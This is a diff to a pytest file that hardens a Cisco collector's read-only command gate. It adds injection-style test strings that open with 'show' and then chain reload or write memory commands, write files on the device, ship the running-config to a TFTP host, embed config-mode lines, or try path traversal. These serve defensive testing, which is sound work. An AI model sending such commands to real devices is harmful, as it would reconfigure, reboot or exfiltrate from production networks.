@@ -30,10 +30,13 @@ negative-control test: known write verbs must be REJECTED by the grammar.
 import ast
 import os
 
+import pytest
+
 import COLLECT_PARSE_V3_23_0 as C
 from cisco_toolkit.attestation import (
     NETWORK_IMPORTS as _NETWORK_IMPORTS,
     READ_ONLY_CMD as _READ_ONLY_CMD,
+    is_read_only_command as _is_read_only_command,
     imported_names as _imported_names,
 )
 
@@ -65,7 +68,7 @@ def test_command_registries_are_read_only():
     assert regs, "no COMMANDS_* registries found — has the collector moved?"
     offenders = {}
     for rname, cmds in regs.items():
-        bad = [c for c in cmds if not _READ_ONLY_CMD.match(str(c).strip())]
+        bad = [c for c in cmds if not _is_read_only_command(c)]
         if bad:
             offenders[rname] = bad
     assert not offenders, f"NON-read-only command(s) in the collection registries: {offenders}"
@@ -128,6 +131,43 @@ def test_ssh_wire_carries_only_show_plus_the_terminal_setup_commands(tmp_path, m
         assert not C.is_ssh_wire_command(controller_cmd)
 
 
+@pytest.mark.parametrize("poisoned", [
+    "show running-config | redirect bootflash:pwn.txt",     # NX-OS: WRITES that file on the device
+    "show running-config | tee bootflash:pwn.txt",          # ditto
+    "show running-config | tftp://10.0.0.9/pwn.txt",        # ships the running-config OFF the device
+    "show version\nconfigure terminal\nhostname PWNED",     # embedded lines are typed at the exec prompt
+    "show version ; reload",
+    "show version && write memory",
+    "show version `reload`",
+    "show running-config > bootflash:pwn.txt",
+    "show run \\..\\..\\..\\evil",   # capture-filename traversal: collect() sanitises '/', not '\'
+])
+def test_a_write_tacked_onto_a_read_verb_never_reaches_the_wire(tmp_path, monkeypatch, poisoned):
+    """The wire gate used to be `^show\\s+\\S` — a check on the FIRST WORD only. Everything after it was
+    unconstrained, so a string that STARTS with a read verb and goes on to mutate the device or egress from
+    it passed the guard whose entire job is to forbid exactly that: `| redirect`/`| tee` write a file ON the
+    device, `| tftp://` ships the running-config off it, and an embedded newline is written to the channel
+    verbatim by netmiko, so the extra lines are typed at the exec prompt (that one enters config mode and
+    renames a production switch).
+
+    No registry entry does this today, which is precisely why it needs a test: the positive grammar exists so
+    that an entry added LATER is excluded BY DEFAULT rather than having to be remembered, and a write tacked
+    onto a read verb is both the most dangerous such entry and the one a prefix check cannot see.
+
+    Driven end-to-end through the real `collect()` with a recording transport, so the assertion is on what
+    would actually be SENT rather than on the predicate in isolation."""
+    monkeypatch.setattr(C, "COMMANDS_IOS", list(C.COMMANDS_IOS) + [poisoned])
+    dev = _RecordingDev()
+    C.collect("SW1", "ios", dev, str(tmp_path / "SW1"))
+    assert dev.sent, "the sweep must actually have run (a collector that sends nothing proves nothing)"
+    assert poisoned not in dev.sent, (
+        f"a device-mutating / egressing string was typed at a production exec prompt: {poisoned!r}")
+    assert not C.is_ssh_wire_command(poisoned)
+    # negative control: the one legitimate pipe in the registries is an output FILTER and must survive
+    assert C.is_ssh_wire_command("show running-config | section ^interface")
+    assert "show version" in dev.sent
+
+
 def test_ssh_send_path_has_no_config_or_write_sink():
     """The SSH collector's protocol-level read-only floor: no module in cisco_toolkit/ + the collector entry
     issues a netmiko CONFIG/write call (send_config_set/from_file, config_mode, configure terminal). send_command
@@ -163,8 +203,31 @@ def test_shared_read_only_grammar_rejects_write_verbs():
                       "aws ec2 authorize-security-group-ingress", "set system host-name x",
                       "execute factoryreset", "copy running-config startup-config",
                       "no shutdown", "delete flash:", "write memory"):
-        assert not _READ_ONLY_CMD.match(write_cmd), \
+        assert not _is_read_only_command(write_cmd), \
             f"read-only grammar wrongly ACCEPTS write command {write_cmd!r}"
+    # The class a VERB-anchored check cannot see: the string opens with a legitimate read verb and
+    # then writes, egresses or chains. `_READ_ONLY_CMD` alone accepts every one of these — which is
+    # why the claim goes through is_read_only_command(). Asserted BOTH ways so the weaker regex can
+    # never quietly become the thing the attestation is built on again.
+    for tacked_on in ("show running-config | redirect bootflash:pwn.txt",   # NX-OS WRITES that file
+                      "show running-config | tftp://10.0.0.9/pwn.txt",      # ships the config off-box
+                      "show running-config | append flash:x",
+                      "show version ; reload",
+                      "show version && write memory",
+                      "show version `reload`",
+                      "show version $(reload)",
+                      "show version > flash:out.txt",
+                      "show run \\..\\..\\..\\evil",                        # Windows path traversal
+                      "show version\nconfigure terminal\nhostname PWNED"):  # newline = a 2nd command
+        assert _READ_ONLY_CMD.match(tacked_on), \
+            f"premise of this check changed — {tacked_on!r} no longer even reaches the verb gate"
+        assert not _is_read_only_command(tacked_on), \
+            f"read-only grammar wrongly ACCEPTS a write tacked onto a read verb: {tacked_on!r}"
+    # ...while the legitimate output filters stay accepted (this must not become a blanket ban)
+    for ok in ("show running-config | section ^interface", "show version | include Version",
+               "show ip route | begin Gateway", "show interface | json",
+               "dataservice/device/counters?deviceId=1.1.1.1"):
+        assert _is_read_only_command(ok), f"read-only grammar wrongly REJECTS {ok!r}"
     # and the import-walk still sees LAZY nested imports (the mechanics stay honest too)
     lazy = ast.parse("def f():\n    import requests\n    from urllib.request import urlopen\n")
     got = _imported_names(lazy)
